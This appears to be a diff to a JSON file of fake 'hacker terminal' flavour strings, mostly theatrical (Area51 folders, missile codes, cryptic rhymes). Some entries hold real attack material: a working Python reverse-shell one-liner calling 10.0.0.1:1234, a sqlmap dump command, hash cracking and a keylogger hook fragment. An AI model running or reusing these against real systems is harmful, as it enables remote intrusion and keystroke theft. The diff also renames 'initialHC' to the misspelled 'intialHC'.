@@ -1,12 +1,21 @@
 {
-    "initialHC": [
+    "intialHC": [
       "//:Initiating override 'System32' please wait while system is connecting to: 192.168.0.1 (loc: whitehouse.gov)",
       "\n$ sqlmap -u 'http://192.168.0.1/id=1' --dump\n\nstarting sqlmap...\n[*] testing connection to the target URL...\n[+] the target URL appears to be 'http://192.168.0.1/id=1'\n[*] starting the exploitation... \n  ",
       "\n$ echo 'Initiating secure access...'\n\nInitiating secure access...\n\n$ sudo apt-get update && sudo apt-get upgrade\n\nReading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nCalculating upgrade... Done\n\n$ python -c 'import \nsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',1234));os.dup2(s.fileno()\n,0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'\n\nConnecting to '10.0.0.1' on port '1234'...\n  ",
       "terminal@root#_: nmap -sP 192.168.1.0/24\nHost is up (0.0078s latency).\nHost is up (0.011s latency).\nHost is up (0.010s latency).\nNmap done: 256 IP addresses (4 hosts up) scanned in 3.29 seconds\n\nterminal@root#_: ping www.example.com\nPING www.example.com (93.184.216.34) 56(84) bytes of data.\n64 bytes from 93.184.216.34: icmp_seq=1 ttl=54 time=11.632 ms\n64 bytes from 93.184.216.34: icmp_seq=2 ttl=54 time=11.726 ms\n\nterminal@root#_: python -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('93.184.216.34', \n80))'",
       "root@cyber-tracker:~# wireshark -k -i eth0\n\nCapturing on 'Ethernet'\n14 18:39:33.265492 IP 192.168.1.1.49352 > 172.217.3.110.443: Flags [.], seq 1041:2389, ack 1, win 229, options , length 1348",
       "root@cyber-tracker:~# apt-get update\n...\nHit:1 http://security.ubuntu.com/ubuntu bionic-security InRelease\nIgn:2 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic InRelease\n...\nReading package lists... Done\n\nroot@cyber-tracker:~# ssh -D 1337 -f -C -q -N john_doe@example.com\n...\njohn_doe@example.com's password:\npassword1234\n...\ndebug1: Enabling compatibility mode for protocol 2.0",
-      "sudo apt update -netbreak.net \n Attempted to connect to Brazilian gov failed at line 69..."
+      "sudo apt update -netbreak.net \n Attempted to connect to Brazilian gov failed at line 69...",
+      "C:hackertools> rainbow_table.txt | grep -o '[A-Za-z0-9.]*@[A-Za.z0-9.]*'\nBillJ89@gmail.com\nanitaHobby@yahoo.com\nskynetAdmin@skynet.com\nnimrod42@gmail.com\n",
+      "@ROOT:~# logout\n$$_User_logout: administrator",
+      "@ROOT:/usr/local/secured# rm -r Classified_Documents\nError: permission denied",
+      "@ROOT:/usr/local/secured/Project_Area51/UFO_Blueprints# nano AntiGravityEngine.png \n>> Opening file...",
+      "@ROOT:/usr/local/secured/Project_Area51# ls\nAlien_DNA_Sequencing/   UFO_Blueprints/   Time_Travel_Research/",
+      "@ROOT:/usr/local/secured# ls\nClassified_Documents/  Project_Area51/  Nuclear_Missile_Code/",
+      "@ROOT:~# pwd  \n/usr/local/secured/",
+      "$$_User_login: administrator\nPassword: **************\n\n$$_Accessing_mainframe_system...success.",
+      "'JACK LEAPT OVER THE RIVER'\n\n'MARY TO FOLLOW, TOGETHER'\n\n'TRAVEL FOLLOW THE SECRET'\n\n'JACK THE RIVER, IT IS DEAD' "
     ],
     "secondaryHC": [
       "\n$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/user/.ssh/id_rsa): \nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \n\n$ netcat -l -p 1234\nlistening on  1234 ...\n    ",
@@ -15,6 +24,15 @@
       "terminal@root#_: sudo -s\n password for terminal:\n\nterminal@root#_: apt-get update\nHit:1 http://security.ubuntu.com/ubuntu bionic-security InRelease\nIgn:2 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic InRelease                                                    \nHit:3 http://archive.ubuntu.com/ubuntu bionic InRelease\nHit:4 http://ppa.launchpad.net/graphics-drivers/ppa/ubuntu bionic InRelease\nRead package lists... Done",
       "$/: dir run -L winrar.exe execute sysmem \n cout << 'devtech' << 'initialize'",
       "root@cyber-tracker:~# exit\nlogout\nConnection to example.com closed.",
-      "root@cyber-tracker:~# nmap -sn 192.168.1.0/24\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-01-01 00:00 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.0045s latency).\n...\nroot@cyber-tracker:~# apt-get install wireshark\n...\nAfter this operation, 210 MB of additional disk space will be used.\nDo you want to continue? [Y/n] \n...\nSetting up wireshark (2.6.8-1~ubuntu18.04.0) ...\nProcessing triggers for libc-bin (2.27-3ubuntu1.2) ..."
+      "root@cyber-tracker:~# nmap -sn 192.168.1.0/24\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-01-01 00:00 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.0045s latency).\n...\nroot@cyber-tracker:~# apt-get install wireshark\n...\nAfter this operation, 210 MB of additional disk space will be used.\nDo you want to continue? [Y/n] \n...\nSetting up wireshark (2.6.8-1~ubuntu18.04.0) ...\nProcessing triggers for libc-bin (2.27-3ubuntu1.2) ...",
+      "C:hackertools> tail -n 5 keylogger.cpp\n\nLRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)) {\n        static char buffer[2] = {0};\n        size_t capslock = keylog::Keylog::keys::getasynckeystate(keylog::Keylog::keys::capslock);\n        buffer[0] = MapVirtualKey(((LCKBDLLHOOK)lParam)->vkCode, 2) ^ ((capslock || shift) ? 0x00 : 0x20);\n        io << buffer;\n    }\n    return CallNextHookEx(hHook, nCode, wParam, lParam);\n}\n\nC:hackertools>",
+      "C:> cd hackertools\n\nC:hackertools> list\n    rainbow_table.txt\n    hashcat.exe\n    keylogger.cpp\n    torbrowser_install.sh\n    \nC:hackertools> hashcat crackme.txt -m 1400 -a 3 ?a?a?a?a?a\nhashcat (v5.1.0) starting...\n\n* Device #1: WARNING! Kernel exec timeout is not disabled\n* Device #2: WARNING! Kernel exec timeout is not disabled\nSession..........: hashcat\nStatus...........: Running\nHash.Type........: Windows NT\nTime.Started.....: Time: 18:24:24\nTime.Estimated...: Time: 20:21:56\nSpeed.Dev.#1.....: 15078.3 kH/s\nRecovered........: 0/1 (0.00%) Digests\nC:hackertools> torbrowser_install.sh\n\nInitializing installer...\n\nDownloading Tor Browser...\nProgress: = 100%\n\nInstalling Tor Browser...\nProgress: = 100%\n\nTor Browser installed successfully!",
+      "$$_Initiating_overload_protocol...Payload_activated.\n> System shut down imminent... ",
+      "@ROOT:/usr/local/secured# chmod 400 Nuclear_Missile_Code\n>> Permissions changed...",
+      "@ROOT:/usr/local/secured/Project_Area51/UFO_Blueprints# cat AntiGravityEngine.png\n> Displaying encrypted content...\n",
+      "@ROOT:/usr/local/secured/Project_Area51# cd UFO_Blueprints/\n> Entering encrypted directory...",
+      "@ROOT:/usr/local/secured# cd Project_Area51\n> Entering secure directory...",
+      "@ROOT:~# sudo access secured files\n> Authorizing...Completed",
+      "'JACK LEAPT OVER THE RIVER'\n\n'MARY FOLLOWED CLOSE BEHIND'\n\n'THEY ARE SEARCHING FOR THE SECRET PLACE'\n\n'I HEAR YOU'"
     ]
   }
